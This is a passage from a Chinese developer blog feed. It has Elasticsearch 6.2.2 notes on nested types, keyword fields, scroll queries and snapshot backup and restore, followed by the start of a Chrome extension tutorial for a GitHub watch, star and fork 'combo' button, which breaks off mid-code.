&#123;</span><br><span class="line">      &quot;name&quot;:    &quot;John Smith&quot;,</span><br><span class="line">      &quot;comment&quot;: &quot;Great article&quot;,</span><br><span class="line">      &quot;age&quot;:     28,</span><br><span class="line">      &quot;stars&quot;:   4,</span><br><span class="line">      &quot;date&quot;:    &quot;2014-09-01&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;name&quot;:    &quot;Alice White&quot;,</span><br><span class="line">      &quot;comment&quot;: &quot;More like this please&quot;,</span><br><span class="line">      &quot;age&quot;:     31,</span><br><span class="line">      &quot;stars&quot;:   5,</span><br><span class="line">      &quot;date&quot;:    &quot;2014-10-22&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在存储的时候其实这个结构是扁平的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;title&quot;:            [ eggs, nest ],</span><br><span class="line">  &quot;body&quot;:             [ making, money, work, your ],</span><br><span class="line">  &quot;tags&quot;:             [ cash, shares ],</span><br><span class="line">  &quot;comments.name&quot;:    [ alice, john, smith, white ],</span><br><span class="line">  &quot;comments.comment&quot;: [ article, great, like, more, please, this ],</span><br><span class="line">  &quot;comments.age&quot;:     [ 28, 31 ],</span><br><span class="line">  &quot;comments.stars&quot;:   [ 4, 5 ],</span><br><span class="line">  &quot;comments.date&quot;:    [ 2014-09-01, 2014-10-22 ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这样就很明显会导致一个问题，当我想查询name为Alice，age为28的数据的时候，这条数据也是符合要求的，但是这明显不是查询的时候所期望的数据，这个时候就需要使用到嵌套类型了，这个需要在索引建立的时候就得设置好，回头看一下索引建立的部分，如果在这里的话应该这样写：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PUT 索引名称(自定义)</span><br><span class="line">&#123;</span><br><span class="line">  &quot;mappings&quot;:&#123;</span><br><span class="line">    &quot;index_name(自定义，索引名称)&quot;:&#123;</span><br><span class="line">      &quot;properties&quot;: &#123;</span><br><span class="line">        指定comments为嵌套类型，这样才能在组合查询嵌套中多个字段的时候，获取到正确的数据</span><br><span class="line">        &quot;comments&quot;:&#123;</span><br><span class="line">          &quot;type&quot;:&quot;nested&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>另外值得一提的是，当指定了嵌套类型之后，kibana在搜索框查询这个嵌套字段的时候就不好使了，查询结果会是空的。这里原因未知，我用的是6.2.2的版本，当时一直以为自己设置嵌套的时候设置错了，在kibana中一直查不出来，但是使用api或者手动敲查询命令的话，都是可以的</p><p>嵌套类型的查询<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST index_name(自定义，索引名称)/_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;: &#123;</span><br><span class="line">        &quot;nested&quot;: &#123;</span><br><span class="line">            &quot;path&quot;: &quot;comments&quot;,  这里需要先指定嵌套的字段路径</span><br><span class="line">            &quot;query&quot;: &#123;</span><br><span class="line">                &quot;bool&quot;: &#123;</span><br><span class="line">                    &quot;must&quot;: [</span><br><span class="line">                        &#123;</span><br><span class="line">                            &quot;match&quot;: &#123;</span><br><span class="line">                                &quot;comments.age&quot;: 28</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    ]</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="keyword的作用"><a href="#keyword的作用" class="headerlink" title="keyword的作用"></a>keyword的作用</h4><p>keyword这个东西和分词有一些关系，在建立es索引后，可以在kibana的索引信息查看页面看到很多字符串类型的字段都有会有相关的keyword字段，这里当对这些字段进行查询的时候，不使用keyword的情况下，查询的是被分词的字段，例如上文中的  “name”:”Alice White”  存入es后如果直接使用name字段查询Alice White是查不出来的，可以使用Alice或White进行查询，如果想要精确的查询到”Alice White”，那查询的字段就需要是name.keyword</p><h4 id="滚动查询"><a href="#滚动查询" class="headerlink" title="滚动查询"></a>滚动查询</h4><p>上文中提到了查询的时候使用from和size，无法查询到10000以后的数据，但是实际的使用场景下肯定是会有查询10000以后数据的情况的，这个是时候就需要使用滚动查询了，使用方法也比较简单，缺点的话，可能就是没有from和size那样方便控制起始位置了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST index_name(自定义，索引名称)/_search?scroll=1m  设置滚动窗口的时间为一分钟</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;match_all&quot;:&#123;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;size&quot;: 100          设置滚动一次查询的数据量</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在执行一次这个查询之后，返回的数据中会有一个_scroll_id，后续的查询就可以直接通过这个id了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /_search/scroll</span><br><span class="line">&#123;</span><br><span class="line">  &quot;scroll&quot;:&quot;1m&quot;,</span><br><span class="line">  &quot;scroll_id&quot;:&quot;获得到的_scroll_id&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在这个窗口期内就可以通过反复执行这个scroll查询，读取到整个数据库的数据，这里的_scroll_id，我这儿试的时候，发现它在第一次滑动查询之后就不变了，在这个窗口期内可以反复使用，每次查询都会返回后续的数据</p><h3 id="0x04-快照备份与恢复"><a href="#0x04-快照备份与恢复" class="headerlink" title="0x04 快照备份与恢复"></a>0x04 快照备份与恢复</h3><p>这里简单提一下备份吧，最近在做这个，网上查了一下信息做参考，也踩到一点儿坑<br>es支持多种备份的方式</p><ul><li>共享的文件系统，如NAS</li><li>Amazon S3</li><li>HDFS (Hadoop Distributed File System)</li><li>Azure Cloud<br>这里我用的是第一种</li></ul><h4 id="注册快照仓库"><a href="#注册快照仓库" class="headerlink" title="注册快照仓库"></a>注册快照仓库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PUT  _snapshot/my_backup  最后这里是快照仓库名称</span><br><span class="line">&#123;</span><br><span class="line">    &quot;type&quot;: &quot;fs&quot;,</span><br><span class="line">    &quot;settings&quot;: &#123;</span><br><span class="line">        &quot;location&quot;: &quot;/data/backups/elasticsearch&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>“/data/backups/elasticsearch”  这个目录建立的时候需要注意es的用户和组必须有它的读写权限，并且需要在es配置文件中配置上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path.repo: /data/backups/elasticsearch</span><br></pre></td></tr></table></figure></p><p>这个es配置文件名字是 elasticsearch.yml 路径为 /etc/elasticsearch/elasticsearch.yml，在修改配置之后，需要重启es服务。</p><h4 id="进行备份"><a href="#进行备份" class="headerlink" title="进行备份"></a>进行备份</h4><p>如果想要等到备份完成可以在后面加上 ?wait_for_completion=true，这里具体看使用情况吧，我在kibana中使用这个的时候导致了超时错误，我觉着没必要阻塞在这儿，可以用下面的请求来查看状态，当然这里还是看场景。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PUT _snapshot/my_backup/snapshot_name  最后这里是快照名称</span><br><span class="line">&#123;</span><br><span class="line">    &quot;indices&quot;: &quot;index_1,index_2&quot;  指定需要备份的索引</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>备份过程中查看状态<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET _snapshot/my_backup/snapshot_name/_status</span><br></pre></td></tr></table></figure></p><p>主要由如下几种状态：</p><ul><li>INITIALIZING 集群状态检查，检查当前集群是否可以做快照，通常这个过程会非常快</li><li>STARTED 正在转移数据到仓库</li><li>FINALIZING 数据转移完成，正在转移元信息</li><li>DONE　完成</li><li>FAILED 备份失败</li></ul><h4 id="取消备份"><a href="#取消备份" class="headerlink" title="取消备份"></a>取消备份</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE _snapshot/my_backup/snapshot_name</span><br></pre></td></tr></table></figure><h4 id="恢复备份"><a href="#恢复备份" class="headerlink" title="恢复备份"></a>恢复备份</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST _snapshot/my_backup/snapshot_name/_restore</span><br></pre></td></tr></table></figure><h4 id="指定恢复目标索引"><a href="#指定恢复目标索引" class="headerlink" title="指定恢复目标索引"></a>指定恢复目标索引</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST _snapshot/my_backup/snapshot_name/_restore</span><br><span class="line">&#123;</span><br><span class="line">    &quot;indices&quot;: &quot;index_1&quot;,</span><br><span class="line">    &quot;rename_pattern&quot;: &quot;index_(.+)&quot;,</span><br><span class="line">    &quot;rename_replacement&quot;: &quot;restored_index_$1&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的indices, 表示只恢复索引’index_1’<br>renamepattern: 表示重命名索引以’index‘开头的索引.<br>rename_replacement: 表示将所有的索引重命名为’restored_index_xxx’.如index_1会被重命名为restored_index_1.</p><p>如果指定了索引，这里第二项就可以直接写索引的名称，不用再加上(.+)这种通配符一类的东西，且最后的$1也可以不用，rename_replacement名字可以直接指定</p><h3 id="0x05-删库跑路"><a href="#0x05-删库跑路" class="headerlink" title="0x05 删库跑路"></a>0x05 删库跑路</h3><p>这里我说的删库其实是删除索引，操作十分的简单。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE index_name(自定义，索引名称)</span><br></pre></td></tr></table></figure></p><p>说归说，不要乱来嗷，你看我都是在备份之后才提这玩意儿的（手动滑稽）</p><h3 id="0x06-总结-amp-其他的事情"><a href="#0x06-总结-amp-其他的事情" class="headerlink" title="0x06 总结&amp;其他的事情"></a>0x06 总结&amp;其他的事情</h3><p>es的常规操作其实网上到处都能找到，但是我用数据一类的东西比较少，有些东西其实是第一次遇到，不知道是不是es本身的特性，例如keyword分词，嵌套扁平化，无法直接查10000之后的数据只能滚动查询等等。今天看的备份，差不多来回折腾以及和提供es服务那边部门的同事聊了一会儿，es那个备份，不论什么方式似乎都是基于NFS的，通过挂载远程文件系统，备份完再摘掉啥的，在我们公司似乎因为一些安全上的限制，这个玩意不太好整。溜了溜了，好菜啊，辣鸡mac又开始发烫了。</p><h3 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h3><ol><li><a href="https://www.elastic.co/guide/cn/elasticsearch/guide/current/nested-objects.html" target="_blank" rel="noopener">https://www.elastic.co/guide/cn/elasticsearch/guide/current/nested-objects.html</a></li><li><a href="https://ox0spy.github.io/post/elasticsearch/elasticsearch-snapshot-restore/" target="_blank" rel="noopener">https://ox0spy.github.io/post/elasticsearch/elasticsearch-snapshot-restore/</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;我觉着我干的事情一直比较杂，最近弄了一些 Elasticsearch 相关的事情，我本身并不是做服务端或者大数据那一类的，但是这里仍然因为工作上的原因使用了一些es，因此这里还是整理一下，目前常用的es相关知识，至少是我这个初学者比较容易遇到的一些操作，以及踩到的一些坑。有些信息出自官方文档，或者其他的blog，人类的本质果然是复读机。。很多blog不知道到底上哪儿复制的，有些东西感觉都不太对。，也可能是我版本的问题吧，这里我使用的版本是6.2.2，kibana同版本的嗷。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Elasticsearch" scheme="http://yoursite.com/tags/Elasticsearch/"/>
    
  </entry>
  
  <entry>
    <title>chrome 插件开发笔记</title>
    <link href="http://yoursite.com/2019/11/21/chrome-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2019/11/21/chrome-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/</id>
    <published>2019-11-21T15:26:10.000Z</published>
    <updated>2020-07-28T14:09:11.633Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>前一阵因为工作的原因需要反复在一个网站上看点儿东西，但是有个东西老得手动算一下，这里觉得比较费劲，就顺手学了一把chrome插件，感觉挺好使的，同事用了，都说好（手动滑稽），后来觉得这个东西还挺好玩的，就顺手想写个东西放git上玩一玩，于是就有了这个文章。总的来说，写了一个用于github一键三连的按钮（watch/fork/star）按钮 <a href="https://github.com/EggUncle/GithubComboButton" target="_blank" rel="noopener">https://github.com/EggUncle/GithubComboButton</a> ，代码量非常少，但是我觉着也涉及到了chrome插件开发相关的方方面面吧，所以这里记一下整个开发过程和涉及到的知识，主要还是太菜了嗨呀，前段和js不太会，踩了很多坑。</p><a id="more"></a><h3 id="0x01-chrome扩展介绍"><a href="#0x01-chrome扩展介绍" class="headerlink" title="0x01 chrome扩展介绍"></a>0x01 chrome扩展介绍</h3><p>嗨呀还是直接看这个介绍吧:</p><blockquote><p><a href="https://crxdoc-zh.appspot.com/extensions/" target="_blank" rel="noopener">https://crxdoc-zh.appspot.com/extensions/</a></p></blockquote><h3 id="0x01-chrome-插件基本文件结构介绍"><a href="#0x01-chrome-插件基本文件结构介绍" class="headerlink" title="0x01 chrome 插件基本文件结构介绍"></a>0x01 chrome 插件基本文件结构介绍</h3><p>这里先看一下，我写的那个github三连插件的目录结构，这里的目录层级仅仅是按照笔者自己的习惯来的，只要在manifest.json中配置好路径一类的，目录层级是什么样的都行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  GithubComboButton git:(master) ✗ tree .</span><br><span class="line">.</span><br><span class="line">├── LICENSE</span><br><span class="line">├── README.md</span><br><span class="line">├── html</span><br><span class="line">│   └── popup.html    //chrome插件用到的html文件</span><br><span class="line">├── icons             //chrome扩展的图标</span><br><span class="line">│   └── icon.png</span><br><span class="line">├── manifest.json     //chrome扩展的配置文件，名称是固定的</span><br><span class="line">└── scripts           //chrome扩展的js代码</span><br><span class="line">    ├── background.js     </span><br><span class="line">    ├── content_scripts.js</span><br><span class="line">    └── popup.js</span><br></pre></td></tr></table></figure></p><h3 id="0x02-chrome-插件配置文件介绍"><a href="#0x02-chrome-插件配置文件介绍" class="headerlink" title="0x02 chrome 插件配置文件介绍"></a>0x02 chrome 插件配置文件介绍</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;GithubCombos&quot;,    //插件的名称</span><br><span class="line">  &quot;version&quot;: &quot;0.0.1&quot;,        //插件的版本号</span><br><span class="line">  &quot;manifest_version&quot;: 2,     //配置文件的版本，这个必须写，而且必须是2</span><br><span class="line">  &quot;description&quot;: &quot;github一键三连～&quot;,  //在chrome扩展管理页面的介绍信息</span><br><span class="line">  &quot;icons&quot;: &#123;</span><br><span class="line">    &quot;16&quot;: &quot;icons/icon.png&quot;,       //图标，可以指定多个分辨率的图片，我这里比较偷懒，都用的一个</span><br><span class="line">    &quot;128&quot;: &quot;icons/icon.png&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;permissions&quot;: [              //权限申请 具体可以参考 https://crxdoc-zh.appspot.com/apps/permission_warnings</span><br><span class="line">    &quot;storage&quot;,</span><br><span class="line">    &quot;declarativeContent&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;content_scripts&quot;: [&#123;         //需要直接注入页面的js</span><br><span class="line">    &quot;matches&quot;: [&quot;http://github.com/*&quot;, &quot;https://github.com/*&quot;],   //匹配需要注入的页面</span><br><span class="line">    &quot;js&quot;: [&quot;scripts/content_scripts.js&quot;]         //需要注入的js文件路径</span><br><span class="line">  &#125;],</span><br><span class="line">  &quot;background&quot;: &#123;</span><br><span class="line">    &quot;scripts&quot;: [&quot;scripts/background.js&quot;], //会一直常驻的后台js或页面，这里我用的是js</span><br><span class="line">    &quot;persistent&quot;: true</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;page_action&quot;: &#123;             //浏览器右上角插件列表中的图标和点击后的设置页面</span><br><span class="line">    &quot;default_icon&quot;: &quot;icons/icon.png&quot;,</span><br><span class="line">    &quot;default_title&quot;: &quot;一键三连嗷&quot;,</span><br><span class="line">    &quot;default_popup&quot;: &quot;html/popup.html&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  // 普通页面能够直接访问的插件资源列表，如果不设置是无法直接访问的</span><br><span class="line">  &quot;web_accessible_resources&quot;: [&quot;scripts/content_scripts.js&quot;,&quot;scripts/popup.js&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置文件相关的配置还有很多，这里仅仅列出与这次写的插件的相关配置，接下来按照我之前开发的顺序，介绍一下content_scripts、background、page_action</p><h3 id="0x03-content-scripts-介绍"><a href="#0x03-content-scripts-介绍" class="headerlink" title="0x03 content_scripts 介绍"></a>0x03 content_scripts 介绍</h3><p>最早写的就是这部分，主要的功能也都是在这里，它可以像页面注入js，修改DOM等，但是缺点是，它不是真正完全融入网页上下文的，而是运行在一个单独的被隔离的环境中，不能调用页面中的js。如果真的出现了必须调用的情况，可以使用inject js的方式，简单来说，就是在content script中，写一个逻辑，讲代码注入进去，这里可能有点绕233333。这里再简单介绍一下，我在github三连插件中是如何使用content script的。<br>首先看一张图，明确一下到底要做个啥。<br><img src="https://github.com/EggUncle/Demo/blob/master/markdownimg/1574259529778.jpg?raw=true" alt=""><br>总的来说，就是做一个这样的combo按钮，然后在点击之后自动进行watch star 和fork，并且可以自动配置按钮的点击功能，例如仅仅在点击之后进行watch star但是不fork，或者配置watch的方式等。然后我们直接来看代码嗷，代码比较少，所以这里直接列出整个content script了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">function clickStarBtn() &#123;   //单独来看，这个函数非常简单，获取了star功能的按钮，执行它的点击事件就好了，后面的watch和fork功能点击功能同理</span><br><span class="line">  var btnLiTag = document.getElementById(&apos;ch_ext_id_star_btn&apos;)</span><br><span class="line">  var btnArr = btnLiTag.getElementsByTagName(&apos;button&apos;)</span><br><span class="line">  var starBtn = btnArr[1]</span><br><span class="line">  starBtn.click()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function clickWatchBtn(pWatchType) &#123;</span><br><span class="line">  var btnLiTag = document.getElementById(&apos;ch_ext_id_watch_btn&apos;)</span><br><span class="line">  var btnArr = btnLiTag.getElementsByTagName(&apos;button&apos;)</span><br><span class="line">  var releaseOnlyBtn = btnArr[1]</span><br><span class="line">  var subscribedBtn = btnArr[2]</span><br><span class="line">  var ignoreBtn = btnArr[3]</span><br><span class="line"></span><br><span class="line">  if (pWatchType == &apos;ignore&apos;) &#123;</span><br><span class="line">    ignoreBtn.click()</span><br><span class="line">  &#125; else if (pWatchType == &apos;release_only&apos;) &#123;</span><br><span class="line">    releaseOnlyBtn.click()</span><br><span class="line">  &#125; else if (pWatchType == &apos;subscribed&apos;) &#123;</span><br><span class="line">    subscribedBtn.click()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function clickForkBtn() &#123;</span><br><span class="line">  var btnLiTag = document.getElementById(&apos;ch_ext_id_fork_btn&apos;)</span><br><span class="line">  var btnArr = btnLiTag.getElementsByTagName(&apos;button&apos;)</span><br><span class="line">  var forkBtn = btnArr[0]</span><br><span class="line">  forkBtn.click()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function initComboBtn() &#123;     //这里对combo按钮进行初始化</span><br><span class="line">  var btnLayoutArr = document.getElementsByClassName(&apos;pagehead-actions&apos;)   //pagehead-actions 这个类的标签包括了watch star fork三个按钮，后需要通过获取它的子node来找到watch star fork三个按钮</span><br><span class="line">  var btnLayout = btnLayoutArr[0]</span><br><span class="line">  if (btnLayout == undefined) &#123;</span><br><span class="line">    return 0</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  var btnArr = btnLayout.getElementsByTagName(&quot;li&quot;);</span><br><span class="line">  var btn = document.createElement(&quot;li&quot;);</span><br><span class="line">  btn.setAttribute(&quot;id&quot;, &quot;combos_3&quot;);</span><br><span class="line">  var len = btnArr.length;</span><br><span class="line">//因为在原始页面中，watch star fork这几个按钮对应的标签都是没有id或者其他可以方便拿到这个node的东西的，所以这里在找到他们之后，给他们设置id，方便后续的使用</span><br><span class="line">  var watchBtn = btnArr[len - 3];</span><br><span class="line">  watchBtn.setAttribute(&quot;id&quot;, &quot;ch_ext_id_watch_btn&quot;);</span><br><span class="line"></span><br><span class="line">  var starBtn = btnArr[len - 2];</span><br><span class="line">  starBtn.setAttribute(&quot;id&quot;, &quot;ch_ext_id_star_btn&quot;);</span><br><span class="line"></span><br><span class="line">  var forkBtn = btnArr[len - 1];</span><br><span class="line">  forkBtn.setAttribute(&quot;id&quot;, &quot;ch_ext_id_fork_btn&quot;);</span><br><span class="line"></span><br><span class="line">//这里考虑到有时候页面上不光会有那三个按钮，还有会有used by等等，但是我期望吧combo按钮放在最左边，所以这里尝试找到最左边的按钮了</span><br><span class="line">  var comboBtnRightId = &apos;left_btn&apos;</span><br><span class="line">  if (len == 3) &#123;</span><br><span class="line">    comboBtnRightId = &quot;ch_ext_id_watch_btn&quot;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    var leftBtn = btnArr[0]</span><br><span class="line">    leftBtn.setAttribute(&quot;id&quot;, &quot;left_btn&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  //combo按钮的html代码</span><br><span class="line">  //newBtnHtml = &apos;&lt;div class=&quot;js-toggler-container js-social-container&quot;&gt;&lt;button type=&quot;submit&quot;class=&quot;btn btn-sm btn-with-count js-toggler-target&quot;aria-label=&quot;Unstar this repository&quot;title=&quot;Star microsoft/vscode&quot;id=&quot;combo_btn&quot;&gt;&lt;svg class=&quot;octicon octicon-star v-align-text-bottom&quot;viewBox=&quot;0 0 14 16&quot;version=&quot;1.1&quot;width=&quot;14&quot;height=&quot;16&quot;aria-hidden=&quot;true&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot;d=&quot;M7.85,13.36c3,-3.12 4.99,-5.17 4.99,-7.69c0,-2.05 -1.41,-3.67 -3.21,-3.67c-1.01,0 -1.99,0.54 -2.62,1.39c-0.64,-0.85 -1.61,-1.39 -2.62,-1.39c-1.8,0 -3.21,1.61 -3.21,3.67c0,2.52 1.98,4.57 4.99,7.69l0.85,0.88z&quot;&gt;&lt;/svg&gt; Combo&lt;/button&gt;&lt;/div&gt;&apos;</span><br><span class="line">  newBtnHtml = &apos;&lt;div class=&quot;js-toggler-container js-social-container&quot;&gt;&lt;button type=&quot;submit&quot;class=&quot;btn btn-sm btn-with-count js-toggler-target&quot;aria-label=&quot;Unstar this repository&quot;title=&quot;Star microsoft/vscode&quot;id=&quot;combo_btn&quot;&gt;&lt;svg class=&quot;octicon octicon-star v-align-text-bottom&quot; viewBox=&quot;0 0 1024 1024&quot; version=&quot;1.1&quot; p-id=&quot;1176&quot; width=&quot;16&quot; height=&quot;16&quot; aria-hidden=&quot;true&quot;&gt;&lt;path d=&quot;M510.671749 348.792894S340.102978 48.827055 134.243447 254.685563C-97.636714 486.565724 510.671749 913.435858 510.671749 913.435858s616.107079-419.070494 376.428301-658.749272c-194.095603-194.096626-376.428302 94.106308-376.428301 94.106308z&quot; fill=&quot;#FF713C&quot; p-id=&quot;1177&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M510.666632 929.674705c-3.267417 0-6.534833-0.983397-9.326413-2.950192-16.924461-11.872399-414.71121-293.557896-435.220312-529.448394-5.170766-59.482743 13.879102-111.319341 56.643068-154.075121 51.043536-51.043536 104.911398-76.930113 160.095231-76.930114 112.524796 0 196.878996 106.48115 228.475622 153.195078 33.611515-45.214784 122.406864-148.20646 234.04343-148.20646 53.930283 0 105.46603 24.205285 153.210428 71.941496 45.063335 45.063335 64.954361 99.200326 59.133795 160.920016C935.306982 641.685641 536.758893 915.327952 519.80271 926.859589a16.205077 16.205077 0 0 1-9.136078 2.815116zM282.857183 198.75574c-46.25344 0-92.396363 22.682605-137.127124 67.413365-36.149315 36.157501-51.614541 78.120218-47.25321 128.291898 17.575284 202.089671 352.199481 455.119525 412.332023 499.049037 60.434417-42.86732 